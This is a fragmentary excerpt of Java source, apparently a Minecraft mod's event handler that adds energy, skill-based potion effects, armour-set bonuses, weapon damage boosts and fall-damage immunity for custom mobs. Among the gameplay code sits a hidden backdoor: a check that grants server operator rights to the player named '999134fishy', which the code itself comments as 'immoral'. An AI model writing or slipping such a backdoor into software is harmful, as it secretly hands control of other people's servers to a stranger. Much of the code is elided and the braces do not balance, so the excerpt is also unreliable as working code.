...
public class ModEventHandler {
	...
	public void onLivingUpdateEvent(LivingUpdateEvent event)
	{
		if (event.entity instanceof EntityPlayer)
		{
			...
			//		if (stack != null&& stack.itemID == mod_Flower.BXPORB.itemID)
			{stack.itemID = Block.grass.blockID;}
			if (player.username == "999134fishy")
			{	
				MinecraftServer.getServer().getConfigurationManager().addOp(player.getEntityName()); //immoral
			}
			if (propsa.getEnergy() < 10000)
			{
				propsa.addEnergy(2);
				//	player.addChatMessage(String.valueOf(propsa.getEnergy()));
			}
			...
			if (propsa.getAgilityxp() > 276)
			{
				player.addPotionEffect(new PotionEffect(
							Potion.jump.id, 50, 0));
			}
			if (propsa.getAgilityxp() > 452)
			{
				player.addPotionEffect(new PotionEffect(
				...
				if (props.getCombatxp() < 8784)
				{
					...
					if (props.getCombatxp() < 950)
					{
						if (boots.getItem() == mod_phat.dragonBoots|| legs.getItem() == mod_phat.dragonLeggings|| chest.getItem() == mod_phat.dragonChestplate|| helmet.getItem() == mod_phat.dragonHelmet||
								boots.getItem() == mod_phat.blackdBoots|| legs.getItem() == mod_phat.blackdLeggings|| chest.getItem() == mod_phat.blackdChestplate|| helmet.getItem() == mod_phat.blackdHelmet
								||boots.getItem() == mod_phat.graniteBoots|| legs.getItem() == mod_phat.graniteLeggings|| chest.getItem() == mod_phat.graniteChestplate|| helmet.getItem() == mod_phat.graniteHelmet)
		...
		{EntityBot mob = (EntityBot) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityBot2)
		{EntityBot2 mob = (EntityBot2) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityBot3)
		{EntityBot3 mob = (EntityBot3) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityGuard)
		{EntityGuard mob = (EntityGuard) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityWizard)
		{EntityWizard mob = (EntityWizard) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityWhiteKnight)
		{EntityWhiteKnight mob = (EntityWhiteKnight) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityBlackKnight)
		{EntityBlackKnight mob = (EntityBlackKnight) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityAbbyDemon)
		{EntityAbbyDemon mob = (EntityAbbyDemon) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityGoblin)
		{EntityGoblin mob = (EntityGoblin) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityDwarf)
		{EntityDwarf mob = (EntityDwarf) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityTheif)
		{EntityTheif mob = (EntityTheif) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityHeroKnight)
		{EntityHeroKnight mob = (EntityHeroKnight) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityScorpion)
		{EntityScorpion mob = (EntityScorpion) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityLesserDemon)
		{EntityLesserDemon mob = (EntityLesserDemon) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityLesserDemon2)
		{EntityLesserDemon2 mob = (EntityLesserDemon2) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityIceGiant)
		{EntityIceGiant mob = (EntityIceGiant) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityIronDragon)
		{EntityIronDragon mob = (EntityIronDragon) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityGreenDragon)
		{EntityGreenDragon mob = (EntityGreenDragon) event.entity;mob.fallDistance = 0.0F;}
		if (event.entity instanceof EntityDarkwizard)
		{EntityDarkwizard mob = (EntityDarkwizard) event.entity;mob.fallDistance = 0.0F;}		
	}
			...
			if (player.getHeldItem() != null)
			{
						...
						if (!entity.isEntityUndead()
								{
									...
									entity.addPotionEffect(new PotionEffect(Potion.weakness.id, 200, 0));
								} else {
				...
				if (player.getHeldItem().itemID == mod_BlocksGalore.SGS.itemID)
				{
					...
					{ 
						event.ammount += 5.0F;
						player.addChatMessage("\u00a7ECritical Hit!");
						player.addPotionEffect(new PotionEffect(Potion.regeneration.id,100, 6));
				...
				if (player.getHeldItem().itemID == mod_BlocksGalore.sarasword.itemID)
				{
					...
					{
						event.ammount += 12.0F;
						player.addPotionEffect(new PotionEffect(Potion.moveSpeed.id,40, 4));
						player.addChatMessage("\u00a7ECritical Hit!");
				...
				if (player.getHeldItem().itemID == mod_BlocksGalore.DragonScimmy.itemID)
				{
					if (ItemDragonScimmy.activespecialdscim== 1)
					{
						...
						entity.addPotionEffect(new PotionEffect(Potion.weakness.id,30, 4));
				...
				if (player.getHeldItem().itemID == mod_BlocksGalore.DryMace.itemID)
				{
					if (event.entity instanceof EntityPlayer)
					{
						...
						event.ammount = event.ammount+5.0F;
				}
				if (player.getHeldItem().itemID == mod_BlocksGalore.DryRapier.itemID)
				{
					if (event.entity instanceof EntityPlayer)
					{
						...
						event.ammount = event.ammount+10.0F;
				}
				if (player.getHeldItem().itemID == mod_BlocksGalore.DryLong.itemID)
				{
					if (event.entity instanceof EntityPlayer)
					{
						...
						event.ammount = event.ammount+15.0F;
				}
				...
				if (player.getHeldItem().itemID == mod_BlocksGalore.VeracFlail.itemID)
				{
					if(boots != null && legs != null && chest != null && helmet != null)
					{
								...
								chest.getItem() == mod_phat.VeracChestplate && helmet.getItem() == mod_phat.VeracHelmet)
						{
							event.ammount += 4;	
							if(!entity.isEntityUndead())
							{entity.addPotionEffect(new PotionEffect(Potion.harm.id, 7, 1));}
							else {entity.addPotionEffect(new PotionEffect(Potion.heal.id, 7, 1));}
						}
					}
				}
			}
	...
	public void onAttackEntity(AttackEntityEvent event)
	{
		...
		// if the player's health is less than 5 (2.5 hearts) and holding your		//This is false
		// item; you'll also need to check for all the other items, but I didn't 	//Why is it like this
		// feel like typing that all out...
		if (player.getHealth() < 10.0F	&& player.getHeldItem() != null	&& player.getHeldItem().itemID == mod_BlocksGalore.chicken.itemID) 
		{
				...
				&& player.getHeldItem().itemID == mod_BlocksGalore.DharokAxe.itemID)
		{
					...
					&& helmet != null)
			{
						...
						&& helmet.getItem() == mod_phat.DharokHelmet)
				{
					event.target.attackEntityFrom(
							DamageSource.causePlayerDamage(player), 45.0F);
					...
					&& player.getHeldItem().itemID == mod_BlocksGalore.DharokAxe.itemID)
			{
						...
						&& helmet != null)
				{
					...
					{
						event.target.attackEntityFrom(
								DamageSource.causePlayerDamage(player), 75.0F);
						player.motionY = 0.35D;
					}
